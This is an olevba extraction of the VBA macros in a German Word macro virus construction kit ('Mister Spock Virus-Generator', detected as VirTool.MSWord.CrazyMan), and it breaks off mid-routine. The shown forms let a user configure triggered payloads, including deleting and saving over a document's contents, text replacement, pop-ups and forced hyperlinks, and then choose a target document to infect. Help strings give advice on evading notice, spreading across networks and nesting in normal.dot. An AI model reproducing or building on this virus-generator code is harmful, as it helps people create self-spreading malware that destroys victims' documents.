olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.CrazyMan
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.CrazyMan - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO FormDatum.frm 
in file: VirTool.MSWord.CrazyMan - OLE stream: 'Macros/VBA/FormDatum'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit
Dim Abbruch As Boolean
Private Sub CommandButton2_Click()
 Abbruch = False
 Unload Me
End Sub
Private Sub CommandButton3_Click()
 Unload Me
End Sub
Private Sub OptionButton1_Change()
 Dat_Datum.Tag = 1
End Sub
Private Sub OptionButton2_Change()
 Dat_Datum.Tag = 2
End Sub
Private Sub OptionButton3_Change()
 Dat_Datum.Tag = 3
End Sub
Private Sub OptionButton4_Change()
 Dat_Datum.Tag = 4
End Sub
Private Sub OptionButton5_Change()
 Dat_Datum.Tag = 5
End Sub
Private Sub OptionButton6_Change()
 Dat_Datum.Tag = 6
End Sub
Private Sub OptionButton7_Change()
 Dat_Datum.Tag = 7
End Sub
Private Sub OptionButton8_Change()
 Dat_Datum.Tag = 8
End Sub
Private Sub OptionButton9_Change()
 Dat_Datum.Tag = 9
End Sub
Private Sub OptionButton10_Change()
 Dat_Datum.Tag = 10
End Sub
Private Sub OptionButton11_Change()
 Dat_Datum.Tag = 11
End Sub
Private Sub OptionButton12_Change()
 Dat_Datum.Tag = 12
End Sub
Private Sub OptionButton13_Change()
 Dat_Datum.Tag = 13
End Sub
Private Sub OptionButton14_Change()
 Dat_Datum.Tag = 14
End Sub
Private Sub OptionButton15_Change()
 Dat_Datum.Tag = 15
End Sub
Private Sub OptionButton16_Change()
 Dat_Datum.Tag = 16
End Sub
Private Sub OptionButton17_Change()
 Dat_Datum.Tag = 17
End Sub
Private Sub OptionButton18_Change()
 Dat_Datum.Tag = 18
End Sub
Private Sub OptionButton19_Change()
 Dat_Datum.Tag = 19
End Sub
Private Sub OptionButton20_Change()
 Dat_Datum.Tag = 20
End Sub
Private Sub OptionButton21_Change()
 Dat_Datum.Tag = 21
End Sub
Private Sub OptionButton22_Change()
 Dat_Datum.Tag = 22
End Sub
Private Sub OptionButton23_Change()
 Dat_Datum.Tag = 23
End Sub
Private Sub OptionButton24_Change()
 Dat_Datum.Tag = 24
End Sub
Private Sub OptionButton25_Change()
 Dat_Datum.Tag = 25
End Sub
Private Sub OptionButton26_Change()
 Dat_Datum.Tag = 26
End Sub
Private Sub OptionButton27_Change()
 Dat_Datum.Tag = 27
End Sub
Private Sub OptionButton28_Change()
 Dat_Datum.Tag = 28
End Sub
Private Sub OptionButton30_Change()
 Dat_Datum.Tag = 30
End Sub
Private Sub OptionButton31_Change()
 Dat_Datum.Tag = 31
End Sub
Private Sub OptionButton32_Change()
 If OptionButton32 Then OptionButton48.Enabled = False Else: OptionButton48.Enabled = True
 Dat_Datum.JedenTag = OptionButton32.Value
End Sub
Private Sub OptionButton36_Click()
 Dat_Datum.Monat = 1: SetMaxTage
End Sub
Private Sub OptionButton37_Click()
 Dat_Datum.Monat = 2: SetMaxTage
End Sub
Private Sub OptionButton38_Click()
 Dat_Datum.Monat = 3: SetMaxTage
End Sub
Private Sub OptionButton39_Click()
 Dat_Datum.Monat = 4: SetMaxTage
End Sub
Private Sub OptionButton40_Click()
 Dat_Datum.Monat = 5: SetMaxTage
End Sub
Private Sub OptionButton41_Click()
 Dat_Datum.Monat = 6: SetMaxTage
End Sub
Private Sub OptionButton42_Click()
 Dat_Datum.Monat = 7: SetMaxTage
End Sub
Private Sub OptionButton43_Click()
 Dat_Datum.Monat = 8: SetMaxTage
End Sub
Private Sub OptionButton44_Click()
 Dat_Datum.Monat = 9: SetMaxTage
End Sub
Private Sub OptionButton45_Click()
 Dat_Datum.Monat = 10: SetMaxTage
End Sub
Private Sub OptionButton46_Click()
 Dat_Datum.Monat = 11: SetMaxTage
End Sub
Private Sub OptionButton47_Click()
 Dat_Datum.Monat = 12: SetMaxTage
End Sub
Private Sub OptionButton48_Change()
 If OptionButton48 Then OptionButton32.Enabled = False Else: OptionButton32.Enabled = True
 Dat_Datum.JedenMonat = OptionButton48.Value
End Sub
Private Sub SetMonat()
 Select Case Dat_Datum.Monat
  Case 1: OptionButton36.Value = True
  Case 2: OptionButton37.Value = True
  Case 3: OptionButton38.Value = True
  Case 4: OptionButton39.Value = True
  Case 5: OptionButton40.Value = True
  Case 6: OptionButton41.Value = True
  Case 7: OptionButton42.Value = True
  Case 8: OptionButton43.Value = True
  Case 9: OptionButton44.Value = True
  Case 10: OptionButton45.Value = True
  Case 11: OptionButton46.Value = True
  Case 12: OptionButton47.Value = True
 End Select
 OptionButton48.Value = Dat_Datum.JedenMonat
End Sub
Private Sub SetDay()
 Select Case Dat_Datum.Tag
  Case 1: OptionButton1.Value = True
  Case 2: OptionButton2.Value = True
  Case 3: OptionButton3.Value = True
  Case 4: OptionButton4.Value = True
  Case 5: OptionButton5.Value = True
  Case 6: OptionButton6.Value = True
  Case 7: OptionButton7.Value = True
  Case 8: OptionButton8.Value = True
  Case 9: OptionButton9.Value = True
  Case 10: OptionButton10.Value = True
  Case 11: OptionButton11.Value = True
  Case 12: OptionButton12.Value = True
  Case 13: OptionButton13.Value = True
  Case 14: OptionButton14.Value = True
  Case 15: OptionButton15.Value = True
  Case 16: OptionButton16.Value = True
  Case 17: OptionButton17.Value = True
  Case 18: OptionButton18.Value = True
  Case 19: OptionButton19.Value = True
  Case 20: OptionButton20.Value = True
  Case 21: OptionButton21.Value = True
  Case 22: OptionButton22.Value = True
  Case 23: OptionButton23.Value = True
  Case 24: OptionButton24.Value = True
  Case 25: OptionButton25.Value = True
  Case 26: OptionButton26.Value = True
  Case 27: OptionButton27.Value = True
  Case 28: OptionButton28.Value = True
  Case 29: OptionButton29.Value = True
  Case 30: OptionButton30.Value = True
  Case 31: OptionButton31.Value = True
 End Select
 OptionButton32.Value = Dat_Datum.JedenTag
End Sub
Private Sub UserForm_Initialize()
 Abbruch = True
 SetDay
 SetMonat
End Sub
Private Sub SetMaxTage()
 Select Case Dat_Datum.Monat
  Case 4, 6, 9, 11
   If Dat_Datum.Tag = 31 Then OptionButton30.Value = True
   OptionButton31.Enabled = False
  Case 1, 3, 5, 7, 8, 10, 12
   OptionButton29.Enabled = True
   OptionButton30.Enabled = True
   OptionButton31.Enabled = True
  Case 2
   If Dat_Datum.Tag = 29 Or Dat_Datum.Tag = 30 Or Dat_Datum.Tag = 31 Then OptionButton28.Value = True
   OptionButton29.Enabled = False
   OptionButton30.Enabled = False
   OptionButton31.Enabled = False
 End Select
End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
 If Abbruch Then Dat_Datum.OK = False Else: Dat_Datum.OK = True
End Sub


-------------------------------------------------------------------------------
VBA MACRO FormFertig.frm 
in file: VirTool.MSWord.CrazyMan - OLE stream: 'Macros/VBA/FormFertig'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit
Private Sub CommandButton_Click()
 Unload Me
End Sub

-------------------------------------------------------------------------------
VBA MACRO FormGenerator.frm 
in file: VirTool.MSWord.CrazyMan - OLE stream: 'Macros/VBA/FormGenerator'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit
Dim Abbruch As Boolean
Private Sub ButtonNO_Click()
 Unload Me
End Sub
Private Sub ButtonOK_Click()
 Abbruch = False
 Unload Me
End Sub
Private Sub UserForm_Initialize()
 Abbruch = True
 Select Case Dat_Zufall.Random
  Case 1: Option1.Value = True
  Case 5: Option2.Value = True
  Case 10: Option3.Value = True
  Case 20: Option4.Value = True
  Case 50: Option5.Value = True
  Case 100: Option6.Value = True
  Case 200: Option7.Value = True
  Case 500: Option8.Value = True
  Case 1000: Option9.Value = True
 End Select
End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
 With Dat_Zufall
  If Not Abbruch Then
   Dat_Zufall.OK = True
   If Option1.Value Then
    .Random = 1
   ElseIf Option2.Value Then .Random = 5
   ElseIf Option3.Value Then .Random = 10
   ElseIf Option4.Value Then .Random = 20
   ElseIf Option5.Value Then .Random = 50
   ElseIf Option6.Value Then .Random = 100
   ElseIf Option7.Value Then .Random = 200
   ElseIf Option8.Value Then .Random = 500
   ElseIf Option9.Value Then .Random = 10000
   Else
    Dat_Zufall.Random = 0
    Dat_Zufall.OK = False
   End If
  Else
   Dat_Zufall.Random = 0
   Dat_Zufall.OK = False
  End If
 End With
End Sub


-------------------------------------------------------------------------------
VBA MACRO FormHyperLink.frm 
in file: VirTool.MSWord.CrazyMan - OLE stream: 'Macros/VBA/FormHyperLink'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit
Dim Abbruch As Boolean
Const HTTP = "HTTP://"
Private Sub ButtonNO_Click()
 Unload Me
End Sub
Private Sub ButtonOK_Click()
 If Left(UCase(Dat_HyperLink.Link), 7) <> HTTP Then Dat_HyperLink.Link = LCase(HTTP) & Dat_HyperLink.Link
 If TestCodierung(Dat_HyperLink.Link) Then
  Abbruch = False
  Unload Me
  Else: MsgBox CodeChar_ERROR, vbCritical, Title_ERROR
 End If
End Sub
Private Sub Text_HyperLink_Change()
 Dat_HyperLink.Link = Trim(Text_HyperLink.Text)
End Sub
Private Sub UserForm_Initialize()
 Abbruch = True
 Text_HyperLink.Text = Dat_HyperLink.Link
 Text_HyperLink.SetFocus
End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
 With Dat_HyperLink
  If Not Abbruch Then
   .OK = .Link <> "" And UCase(Dat_HyperLink.Link) <> HTTP
   If Not .OK Then GoTo beenden Else Exit Sub
  ElseIf .Link = "" And UCase(Dat_HyperLink.Link) <> HTTP Then
   GoTo beenden
  ElseIf MsgBox("Hyperlink-Eintrag verwerfen ?", vbExclamation + vbDefaultButton2 + vbYesNo, "Bist du sicher ?") = vbYes Then
   GoTo beenden
   Else: Cancel = -1: Abbruch = False
  End If
 End With
 Exit Sub
beenden:
 With Dat_HyperLink
  .Link = ""
  .OK = False
 End With
End Sub

-------------------------------------------------------------------------------
VBA MACRO FormReplace.frm 
in file: VirTool.MSWord.CrazyMan - OLE stream: 'Macros/VBA/FormReplace'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit
Dim Abbruch As Boolean
Private Sub ButtonNO_Click()
 Unload Me
End Sub
Private Sub ButtonOK_Click()
 If TestCodierung(Dat_Replace.Orginal) And TestCodierung(Dat_Replace.Replace) Then
  Abbruch = False
  Unload Me
   Else: MsgBox CodeChar_ERROR, vbCritical, Title_ERROR
 End If
 End Sub
Private Sub Check_ganzesWort_Change()
 Dat_Replace.GanzesWort = Check_ganzesWort.Value
End Sub
Private Sub Text_Orginal_Change()
 Dat_Replace.Orginal = Trim(Text_Orginal.Text)
End Sub
Private Sub Text_Replace_Change()
 Dat_Replace.Replace = Trim(Text_Replace.Text)
End Sub
Private Sub UserForm_Initialize()
 Abbruch = True
 With Dat_Replace
  Text_Orginal.Text = .Orginal
  Text_Replace.Text = .Replace
  Check_ganzesWort.Value = .GanzesWort
 End With
End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
 With Dat_Replace
  If Not Abbruch Then
   .OK = .Orginal <> "" And .Replace <> ""
   If Not .OK Then GoTo beenden Else Exit Sub
    ElseIf .Orginal = "" And .Replace = "" Then
     GoTo beenden
      ElseIf MsgBox("Alle Einträge verwerfen ?", vbExclamation + vbDefaultButton2 + vbYesNo, "Bist du sicher ?") = vbYes Then
       GoTo beenden
    Else: Cancel = -1: Abbruch = False
  End If
 End With
 Exit Sub
beenden:
 With Dat_Replace
  .Orginal = ""
  .Replace = ""
  .OK = False
 End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO FormStartOptionen.frm 
in file: VirTool.MSWord.CrazyMan - OLE stream: 'Macros/VBA/FormStartOptionen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit
Dim Abbruch As Boolean
Private Sub Button_Datum_Click()
 FormDatum.Show
 Dat_Datum.Auswahl = Dat_Datum.OK
 Button_Datum_View
End Sub
Private Sub Button_ZufallsGenerator_Click()
 FormGenerator.Show
 Dat_Zufall.Auswahl = Dat_Zufall.OK
 Button_ZufallsGenerator_View
End Sub
Private Sub CommandNO_Click()
 Unload Me
End Sub
Private Sub CommandOK_Click()
 Abbruch = False
 Unload Me
End Sub
Private Sub Check_Datum_Change()
 Dat_Datum.Auswahl = Check_Datum.Value
End Sub
Private Sub Check_ZufallsGenerator_Change()
 Dat_Zufall.Auswahl = Check_ZufallsGenerator.Value
End Sub
Private Sub UserForm_Activate()
 UserForm_Initialize
End Sub
Private Sub UserForm_Initialize()
 Abbruch = True
 Button_Datum.SetFocus
 Button_Datum_View
 Button_ZufallsGenerator_View
End Sub
Private Sub Button_Datum_View()
 Dim TagStr As String, MonatStr As String
 With Dat_Datum
  If .OK Then
   If .JedenTag Then TagStr = "   jeder Tag im" Else TagStr = "   am" & Str(.Tag) & "."
   If .JedenMonat Then MonatStr = " in jedem Monat" Else MonatStr = GetMonatsName(.Monat)
   Button_Datum.Picture = MainUserForm.ImageOK.Picture
   Button_Datum.Caption = TagStr & MonatStr
  Else
   Button_Datum.Picture = MainUserForm.ImageNO.Picture
   Button_Datum.Caption = " ...  "
  End If
  Check_Datum.Enabled = .OK
  Check_Datum.Value = .Auswahl
 End With
End Sub
Private Sub Button_ZufallsGenerator_View()
 With Dat_Zufall
  If .OK Then
   Button_ZufallsGenerator.Picture = MainUserForm.ImageOK.Picture
   Button_ZufallsGenerator.Caption = "   1 :" & Str(.Random)
  Else
   Button_ZufallsGenerator.Picture = MainUserForm.ImageNO.Picture
   Button_ZufallsGenerator.Caption = " ...  "
  End If
  Check_ZufallsGenerator.Enabled = .OK
  Check_ZufallsGenerator.Value = .Auswahl
 End With
End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
 If Abbruch Then
  If Dat_Datum.OK Or Dat_Zufall.OK Then
   If MsgBox("Alle Einträge verwerfen ?", vbExclamation + vbDefaultButton2 + vbYesNo, "Bist du sicher ?") = vbNo Then
    Cancel = -1: Exit Sub
   End If
  End If
  Else: Exit Sub
 End If
 With Dat_Datum
  .Tag = 1
  .Monat = 1
  .JedenTag = False
  .JedenMonat = False
  .OK = False
  .Auswahl = False
  Check_Datum.Enabled = .OK
 End With
 With Dat_Zufall
  .Random = 0
  .OK = False
  .Auswahl = False
 End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO FormTextBox.frm 
in file: VirTool.MSWord.CrazyMan - OLE stream: 'Macros/VBA/FormTextBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit
Dim Symbol As Byte, OldSymbol As Byte, Abbruch As Boolean
Private Sub Check_mitSymbol_Change()
 If Check_mitSymbol.Value Then
  Option_VbCritical.Enabled = True
  Option_VbQuestion.Enabled = True
  Option_VbExclamation.Enabled = True
  Option_VbInformation.Enabled = True
  Symbol = OldSymbol
 Else
  Option_VbCritical.Enabled = False
  Option_VbQuestion.Enabled = False
  Option_VbExclamation.Enabled = False
  Option_VbInformation.Enabled = False
  OldSymbol = Symbol
  Symbol = 0
 End If
End Sub
Private Sub Command_Test_Click()
 If Trim(Dat_TextBox.Title) = "" And Trim(Dat_TextBox.Prompt) = "" Then
  MsgBox "Nichs zum Testen gefunden.     ", vbInformation, "Kein Eintrag vorhanden !!!"
  Exit Sub
 ElseIf TestCodierung(Dat_TextBox.Title) And TestCodierung(Dat_TextBox.Prompt) Then
  MsgBox Dat_TextBox.Prompt, Symbol, Dat_TextBox.Title
  Else: MsgBox CodeChar_ERROR, vbCritical, Title_ERROR
 End If
End Sub
Private Sub CommandOK_Click()
 If TestCodierung(Dat_TextBox.Title) And TestCodierung(Dat_TextBox.Prompt) Then
  Abbruch = False
  Unload Me
  Else: MsgBox CodeChar_ERROR, vbCritical, Title_ERROR
 End If
End Sub
Private Sub CommandNO_Click()
 Unload Me
End Sub
Private Sub Option_VbCritical_Change()
 Symbol = vbCritical
 Dat_TextBox.Symbol = Symbol
End Sub
Private Sub Option_VbQuestion_Change()
 Symbol = vbQuestion
 Dat_TextBox.Symbol = Symbol
End Sub
Private Sub Option_VbExclamation_Change()
 Symbol = vbExclamation
 Dat_TextBox.Symbol = Symbol
End Sub
Private Sub Option_VbInformation_Change()
 Symbol = vbInformation
 Dat_TextBox.Symbol = Symbol
End Sub
Private Sub Text_Title_Change()
 Dat_TextBox.Title = Text_Title.Text
 LabelInfo1 = Str(Len(Dat_TextBox.Title))
End Sub
Private Sub Text_Prompt_Change()
 If Len(Text_Prompt.Text) > 99 Then
  Text_Prompt.Text = Dat_TextBox.Prompt: Beep
 Else
  Dat_TextBox.Prompt = Text_Prompt.Text
  LabelInfo2 = Str(Len(Dat_TextBox.Prompt))
 End If
End Sub
Private Sub UserForm_Initialize()
 Text_Title.SetFocus
 Text_Title = Dat_TextBox.Title
 Text_Prompt = Dat_TextBox.Prompt
 LabelInfo1 = Str(Len(Dat_TextBox.Title))
 LabelInfo2 = Str(Len(Dat_TextBox.Prompt))
 Select Case Dat_TextBox.Symbol
  Case vbCritical: Option_VbCritical.Value = True
  Case vbQuestion: Option_VbQuestion.Value = True
  Case vbExclamation: Option_VbExclamation.Value = True
  Case vbInformation: Option_VbInformation.Value = True
 End Select
 Check_mitSymbol.Value = Dat_TextBox.SymbolAktiv
 Symbol = Dat_TextBox.Symbol
 Abbruch = True
End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
 With Dat_TextBox
  If Not Abbruch Then
   .OK = .Title <> "" Or .Prompt <> ""
   If Not .OK Then GoTo beenden Else Exit Sub
  ElseIf .Title = "" And .Prompt = "" Then
   GoTo beenden
  ElseIf MsgBox("Alle Einträge in der Textbox verwerfen ?", vbExclamation + vbDefaultButton2 + vbYesNo, "Bist du sicher ?") = vbYes Then
   GoTo beenden
   Else: Cancel = -1: Abbruch = False
  End If
 End With
 Exit Sub
beenden:
 Dat_TextBox.Title = ""
 Dat_TextBox.Prompt = ""
 Dat_TextBox.OK = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO FormVirus.frm 
in file: VirTool.MSWord.CrazyMan - OLE stream: 'Macros/VBA/FormVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit
Dim Abbruch As Boolean
Private Sub Command_DocNeu_Click()
 Dim OldZiel As Object
 Set OldZiel = ZielDocument
 Set ZielDocument = Documents.Add
 If SaveAs(ZielDocument) Then
  Label_Ziel.Caption = ZielDocument.FullName
  Init_Liste
 Else
  ZielDocument.Close
  Set ZielDocument = OldZiel
 End If
End Sub
Private Sub Command_DocOpen_Click()
 Dim OK As Boolean
 MsgBox "ACHTUNG - Ich kann nicht prüfen ob das zu öffnende Dokument schon infiziert ist !!!" & vbCr & vbCr & _
        "Wenn du versuchst ein infiziertes Dokument zu öffnen, dann macht sich die darin" & vbCr & _
        "enthaltende Kopie von mir sofort daran sich in deiner ""normal.dot"" einzunisten." & vbCr & vbCr & _
        "Also sei vorsichtig.", vbExclamation, EsIstIch & "- WARNUNG"
 OK = False
 If Dialogs(wdDialogFileOpen).Show <> 0 Then
  OK = True
  Set ZielDocument = ActiveDocument
  Label_Ziel.Caption = ZielDocument.FullName
  Init_Liste
  If MsgBox("Soll ich zur Sicherheit eine Kopie des Zieldokument infizieren.", vbQuestion + vbDefaultButton1 + vbYesNo, EsIstIch & " - Sicherheitskopie anlegen") = vbYes Then
   If SaveAs(ZielDocument) Then
    Set ZielDocument = ActiveDocument
    Label_Ziel.Caption = ZielDocument.FullName
    Init_Liste
   End If
  End If
  Else: MsgBox "Dokument wurde nicht geöffnet !!!   " & vbCr & "Vorgang wurde abgebrochen.", vbCritical, EsIstIch & " - Abbruch"
 End If
 Application.Visible = False
End Sub
Private Sub CommandNO_Click()
 Unload Me
End Sub
Private Sub CommandOK_Click()
 If ZielDocument Is Nothing Then
  MsgBox "Es wurde kein Ziel-Dokument ausgewählt.", vbCritical, "Wo soll ich hin ?"
 Else
  Abbruch = False
  Unload Me
 End If
End Sub
Private Sub List_Doc_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
 Dim OldZiel As Object
 If List_Doc.ListIndex = -1 Then Exit Sub
 Set OldZiel = ZielDocument
 Set ZielDocument = Documents(List_Doc.List(List_Doc.ListIndex))
 If InStr(2, ZielDocument.FullName, ":\") = 0 Then
  If Not SaveAs(ZielDocument) Then
   ZielDocument.Close
   Set ZielDocument = OldZiel
   Else: Init_Liste
  End If
 End If
 If Not ZielDocument Is Nothing Then Label_Ziel.Caption = ZielDocument.FullName
End Sub
Private Sub List_Doc_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
 Dim OldZiel As Object
 If KeyAscii <> 13 Or List_Doc.ListIndex = -1 Then Exit Sub
 Set OldZiel = ZielDocument
 Set ZielDocument = Documents(List_Doc.List(List_Doc.ListIndex))
 If InStr(2, ZielDocument.FullName, ":\") = 0 Then
  If Not SaveAs(ZielDocument) Then
   ZielDocument.Close
   Set ZielDocument = OldZiel
   Else: Init_Liste
  End If
 End If
 If Not ZielDocument Is Nothing Then Label_Ziel.Caption = ZielDocument.FullName
End Sub
Private Sub UserForm_Initialize()
 Abbruch = True
 Set ZielDocument = Nothing
 Label_Ziel.Caption = "..."
 Command_DocNeu.SetFocus
 Init_Liste
End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
 If Abbruch Then Set ZielDocument = Nothing
End Sub
Private Sub Init_Liste()
 Dim x As Long
 List_Doc.Clear
 For x = 1 To Documents.Count
  If Documents(x).BuiltInDocumentProperties.Item(1).Value <> "Mister Spock Virus-Generator Version 1.0" Then List_Doc.AddItem Documents(x).FullName
 Next x
 If List_Doc.ListCount > 0 Then List_Doc.ListIndex = 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO MainUserForm.frm 
in file: VirTool.MSWord.CrazyMan - OLE stream: 'Macros/VBA/MainUserForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit
Private Sub Button_PGP_Click()
 PGP_Schlüssel
End Sub
Private Sub Button_TextBox_Hilfe_Click()
 MsgBox "Zeigt eine Textbox mit vorgegebenen Text und Symbol an." & vbCr & vbCr & _
        "Wähle die Startoptionen der Textbox sorgfältig aus, denn nichts ist " & vbCr & _
        "auffälliger als eine Box mit einem blödsinnigen Spruch.", vbInformation, EsIstIch & " - Hilfe: Textbox"
End Sub
Private Sub Button_HyperLink_Hilfe_Click()
 MsgBox "Öffnet eine Internet-Adresse im aktuellen Dokument (oder im Standardbrowser)" & vbCr & vbCr & _
        "Beachte, dass ein Virus sich auf Dauer nicht auf ""einem"" Rechner" & vbCr & _
        "oder in ""einem"" Netzwerk einsperren läßt !!!" & vbCr & _
        "Intranetseiten sind  zum Teil nicht über das Internet zu erreichen," & vbCr & _
        "und ein Link auf deine Homepage ist auch ""ganz wenig auffällig"".", vbInformation, EsIstIch & " - Hilfe: Hyperlink"
End Sub
Private Sub Button_TextTauschen_Hilfe_Click()
 MsgBox "Sucht Wörter, Wort-Abschnitte oder Buchstaben und tauscht sie gegen anderen Text aus." & vbCr & vbCr & _
        """der"" in ""die"" oder ""a"" in ""u"" kommt immer wahnsinnig gut an." & vbCr & _
        "Bei dem Suchbegriff spielt Groß- oder Klein- Schreibung keine Rolle" & vbCr & _
        "Aber denke immer daran: fehlerhafte Texte sind nur dann lustig, wenn" & vbCr & _
        "der Autor es nicht schon beim Schreiben merkt." & vbCr & vbCr & _
        "Also überreize nicht deine Möglichkeiten.", vbInformation, EsIstIch & " - Hilfe: Text ersetzen"
End Sub
Private Sub Check_AkivDocDel_Hilfe_Click()
 MsgBox "Markiert den Inhalt des aktiven Dokumentes, löscht diesen und speichert das Dokument" & vbCr & vbCr & _
        "Entweder es passiert beim Öffnen oder beim Schließen des Dokumentes," & vbCr & _
        "und es sieht immer so aus als sei man die letzten  drei Stunden wahnsinnig müde gewesen." & vbCr & vbCr & _
        "Das besonders Ärgerliche ist aber, dass ich zu meinem Schutz Word das automatische Speichern verbiete.", vbInformation, EsIstIch & " - Hilfe: Text löschen"
End Sub
Private Sub Button_TextBox_Option_Click()
 FormStartOptionen.Caption = "Textbox - Startoptionen"
 Dat_Datum = Dat_TextBox.Datum
 Dat_Zufall = Dat_TextBox.Zufall
 With FormGenerator
  .Option1.Enabled = False: .Option2.Enabled = False: .Option3.Enabled = False: .Option4.Value = True
 End With
 FormStartOptionen.Show
 With FormGenerator
  .Option1.Enabled = True: .Option2.Enabled = True: .Option3.Enabled = True
 End With
 Dat_TextBox.Datum = Dat_Datum
 Dat_TextBox.Zufall = Dat_Zufall
 If Dat_TextBox.Datum.Auswahl Then
  Button_TextBox_Option.Caption = Trim(FormStartOptionen.Button_Datum.Caption)
  If Dat_TextBox.Zufall.Auswahl Then Button_TextBox_Option.Caption = Button_TextBox_Option.Caption & " (" & Trim(FormStartOptionen.Button_ZufallsGenerator.Caption) & ")"
 ElseIf Dat_TextBox.Zufall.Auswahl Then
  Button_TextBox_Option.Caption = Trim(FormStartOptionen.Button_ZufallsGenerator.Caption)
  If Dat_TextBox.Datum.Auswahl Then If Dat_TextBox.Zufall.Auswahl Then If Dat_TextBox.Zufall.Auswahl Then Button_TextBox_Option.Caption = Button_TextBox_Option.Caption & " (" & Trim(FormStartOptionen.Button_Datum.Caption) & ")"
  Else: Button_TextBox_Option.Caption = "Torpedo abfeuern ..."
 End If
 Check_TextBox.Enabled = Dat_TextBox.OK And (Dat_TextBox.Datum.Auswahl Or Dat_TextBox.Zufall.Auswahl)
 Check_TextBox.Value = Check_TextBox.Enabled
End Sub
Private Sub Button_HyperLink_Optionen_Click()
 FormStartOptionen.Caption = "HyperLink - Startoptionen"
 Dat_Datum = Dat_HyperLink.Datum
 Dat_Zufall = Dat_HyperLink.Zufall
 With FormGenerator
  .Option1.Enabled = False: .Option2.Enabled = False: .Option3.Enabled = False: .Option4.Value = True
 End With
 FormStartOptionen.Show
 With FormGenerator
  .Option1.Enabled = True: .Option2.Enabled = True: .Option3.Enabled = True
 End With
 Dat_HyperLink.Datum = Dat_Datum
 Dat_HyperLink.Zufall = Dat_Zufall
 If Dat_HyperLink.Datum.Auswahl Then
  Button_HyperLink_Optionen.Caption = Trim(FormStartOptionen.Button_Datum.Caption)
  If Dat_HyperLink.Zufall.Auswahl Then Button_HyperLink_Optionen.Caption = Button_HyperLink_Optionen.Caption & " (" & Trim(FormStartOptionen.Button_ZufallsGenerator.Caption) & ")"
 ElseIf Dat_HyperLink.Zufall.Auswahl Then
  Button_HyperLink_Optionen.Caption = Trim(FormStartOptionen.Button_ZufallsGenerator.Caption)
  If Dat_HyperLink.Datum.Auswahl Then If Dat_HyperLink.Zufall.Auswahl Then If Dat_HyperLink.Zufall.Auswahl Then Button_HyperLink_Optionen.Caption = Button_HyperLink_Optionen.Caption & " (" & Trim(FormStartOptionen.Button_Datum.Caption) & ")"
  Else: Button_HyperLink_Optionen.Caption = "Torpedo abfeuern ..."
 End If
 Check_HyperLink.Enabled = Dat_HyperLink.OK And (Dat_HyperLink.Datum.Auswahl Or Dat_HyperLink.Zufall.Auswahl)
 Check_HyperLink.Value = Check_HyperLink.Enabled
End Sub
Private Sub Button_TextTauschen_Optionen_Click()
 FormStartOptionen.Caption = "Text tauschen - Startoptionen"
 Dat_Datum = Dat_Replace.Datum
 Dat_Zufall = Dat_Replace.Zufall
 With FormGenerator
  .Option7.Enabled = False: .Option8.Enabled = False: .Option9.Enabled = False: .Option1.Value = True
 End With
 FormStartOptionen.Show
 With FormGenerator
  .Option7.Enabled = True: .Option8.Enabled = True: .Option9.Enabled = True
 End With
 Dat_Replace.Datum = Dat_Datum
 Dat_Replace.Zufall = Dat_Zufall
 If Dat_Replace.Datum.Auswahl Then
  Button_TextTauschen_Optionen.Caption = Trim(FormStartOptionen.Button_Datum.Caption)
  If Dat_Replace.Zufall.Auswahl Then Button_TextTauschen_Optionen.Caption = Button_TextTauschen_Optionen.Caption & " (" & Trim(FormStartOptionen.Button_ZufallsGenerator.Caption) & ")"
 ElseIf Dat_Replace.Zufall.Auswahl Then
  Button_TextTauschen_Optionen.Caption = Trim(FormStartOptionen.Button_ZufallsGenerator.Caption)
  If Dat_Replace.Datum.Auswahl Then If Dat_Replace.Zufall.Auswahl Then If Dat_Replace.Zufall.Auswahl Then Button_TextTauschen_Optionen.Caption = Button_TextTauschen_Optionen.Caption & " (" & Trim(FormStartOptionen.Button_Datum.Caption) & ")"
  Else: Button_TextTauschen_Optionen.Caption = "Torpedo abfeuern ..."
 End If
 Check_TextTauschen.Enabled = Dat_Replace.OK And (Dat_Replace.Datum.Auswahl Or Dat_Replace.Zufall.Auswahl)
 Check_TextTauschen.Value = Check_TextTauschen.Enabled
End Sub
Private Sub Check_AkivDocDel_Optionen_Click()
 FormStartOptionen.Caption = "Aktives Dokument löschen - Startoptionen"
 Dat_Datum = Dat_AkivDocDel.Datum
 Dat_Zufall = Dat_AkivDocDel.Zufall
 With FormGenerator
  .Option1.Enabled = False: .Option2.Enabled = False: .Option3.Enabled = False: .Option4.Value = True
 End With
 FormStartOptionen.Show
 With FormGenerator
  .Option1.Enabled = True: .Option2.Enabled = True: .Option3.Enabled = True
